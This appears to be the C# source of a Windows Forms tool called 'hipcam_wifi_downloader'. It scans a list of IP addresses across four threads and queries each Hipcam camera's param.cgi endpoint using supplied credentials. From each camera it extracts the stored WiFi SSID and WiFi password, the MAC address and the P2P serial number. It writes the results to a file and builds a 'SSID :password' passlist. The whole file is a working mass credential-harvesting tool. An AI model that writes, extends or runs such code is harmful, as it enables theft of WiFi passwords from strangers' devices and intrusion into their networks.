using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

//written by knedit, 2019

namespace hipcam_wifi_downloader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public class MyWebClient : WebClient
        {
            protected override WebRequest GetWebRequest(Uri address)
            {
                var req = base.GetWebRequest(address);
                req.Timeout = 5000;
                return req;
            }
        }

        public string[] lines;
        public int filelengh;
        public string outputfilename;
        public string passlistoutputfilename;
        public bool wantsPasslist = false;
        public List<string> data = new List<string> { "" };
        public List<string> userpass = new List<string> { "" };
        public int tested;

        public void massTestThread(string[] iplist)
        {
            foreach (string line in iplist)
            {
                try
                {
                    Console.WriteLine(line);
                    string temps = getIpData(line, true);
                    this.Invoke(new MethodInvoker(delegate ()
                    {
                        richTextBox1.Text = temps;
                    }));
                }
                catch
                {
                    //bad stuff happened
                }

            }      
        }

        public string getIpData(string ip, bool isUsingMass)
        {
            using (MyWebClient client = new MyWebClient())
            {
                tested++;
                this.Invoke(new MethodInvoker(delegate ()
                {
                    label4.Text = tested + " / " + filelengh;
                }));
                string emptystr = "IP:\n " + "" + "\n\nWIFI SSID:\n" + "" + "\n\nWIFI PASSWORD:\n" + "" + "\n\nMAC ADDREDD:\n" + "" + "\n\nSERIAL NUMBER:\n" + "";
                client.Credentials = new NetworkCredential(textBox2.Text, textBox3.Text);
                string newip = ip;
                if (!(newip.Contains("http://")))
                {
                    newip = "http://" + newip;
                }
                try
                {
                    string url = newip + "/cgi-bin/hi3510/param.cgi?cmd=getwirelessattr&cmd=getnetattr&cmd=gethip2pattr";
                    byte[] clidata = client.DownloadData(url);
                    Console.WriteLine(Encoding.UTF8.GetString(clidata));
                    string outdata = Encoding.UTF8.GetString(clidata);
                    string[] findata = outdata.Split(new string[] { "var" }, StringSplitOptions.None);
                    Console.WriteLine(findata.Length);

                    string tmpwifistr = "";
                    string tmpkeystr = "";
                    string tmpmacstr = "";
                    string tmpsrlstr = "";
                    string outputstr = "";

                    for (int i = 0; i < findata.Length; i++)
                    {

                        Console.WriteLine(i);

                        if (findata[i].Contains("wf_ssid"))
                        {
                            tmpwifistr = findata[i].Replace("wf_ssid=\"", "");
                            tmpwifistr = tmpwifistr.Remove(tmpwifistr.Length - 4);
                            Console.WriteLine(tmpwifistr);
                        }

                        if (findata[i].Contains("wf_key="))
                        {
                            tmpkeystr = findata[i].Replace("wf_key=\"", "");
                            tmpkeystr = tmpkeystr.Remove(tmpkeystr.Length - 4);
                            Console.WriteLine(tmpkeystr);
                        }

                        if (findata[i].Contains("macaddress="))
                        {
                            tmpmacstr = findata[i].Replace("macaddress=\"", "");
                            tmpmacstr = tmpmacstr.Remove(tmpmacstr.Length - 4);
                            Console.WriteLine(tmpmacstr);
                        }

                        if (findata[i].Contains("hip2p_uid="))
                        {
                            tmpsrlstr = findata[i].Replace("hip2p_uid=\"", "");
                            tmpsrlstr = tmpsrlstr.Remove(tmpsrlstr.Length - 4);
                            Console.WriteLine(tmpsrlstr);
                        }
                        //richTextBox1.Text = outputstr;
                    }

                    outputstr = "IP:\n " + ip + "\n\nWIFI SSID:\n" + tmpwifistr + "\n\nWIFI PASSWORD:\n" + tmpkeystr + "\n\nMAC ADDREDD:\n" + tmpmacstr + "\n\nSERIAL NUMBER:\n" + tmpsrlstr;
                    data.Add(outputstr + "\n\n"); 
                    if (!string.IsNullOrEmpty(tmpwifistr) && isUsingMass)
                    {
                        userpass.Add(tmpwifistr + " :" + tmpkeystr);
                        System.IO.File.WriteAllText(outputfilename, string.Join("\n", data));
                    }
                    if (isUsingMass)
                    {
                        
                        System.IO.File.WriteAllText(passlistoutputfilename, string.Join("\n", userpass));
                    }
                    return outputstr;
                }
                catch
                {
                    //badip
                    return emptystr;
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string ipdata = getIpData(textBox1.Text, false);
            richTextBox1.Text = ipdata;

        }

        private void button2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "Open Input File";
                dlg.Filter = "Text Files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    string inputFileName = dlg.FileName;
                    lines = System.IO.File.ReadAllLines(inputFileName);
                    filelengh = lines.Count();
                    label4.Text = "0 / " + filelengh;
                    button2.ForeColor = System.Drawing.Color.DarkGreen;
                }
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog dlg = new SaveFileDialog())
            {
                dlg.Title = "Open Output File";
                dlg.Filter = "Text Files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    outputfilename = dlg.FileName;
                    button3.ForeColor = System.Drawing.Color.DarkGreen;
                }
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            using (SaveFileDialog dlg = new SaveFileDialog())
            {
                dlg.Title = "Open Passlist Output File";
                dlg.Filter = "Text Files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    wantsPasslist = true;
                    passlistoutputfilename = dlg.FileName;
                    button4.ForeColor = System.Drawing.Color.DarkGreen;
                }
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {
            string[] Ofirstsplit = lines.Take(lines.Length / 2).ToArray();
            string[] Osecondsplit = lines.Skip(lines.Length / 2).ToArray();

            string[] firstsplit = Ofirstsplit.Take(Ofirstsplit.Length / 2).ToArray();
            string[] secondsplit = Ofirstsplit.Skip(Ofirstsplit.Length / 2).ToArray();
            string[] thirdsplit = Osecondsplit.Take(Osecondsplit.Length / 2).ToArray();
            string[] forthsplit = Osecondsplit.Skip(Osecondsplit.Length / 2).ToArray();

            Thread a = new Thread(() => massTestThread(firstsplit));
            Thread b = new Thread(() => massTestThread(secondsplit));
            Thread c = new Thread(() => massTestThread(thirdsplit));
            Thread d = new Thread(() => massTestThread(forthsplit));
            a.IsBackground = true;
            b.IsBackground = true;
            c.IsBackground = true;
            d.IsBackground = true;
            a.Start();
            b.Start();
            c.Start();
            d.Start();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}
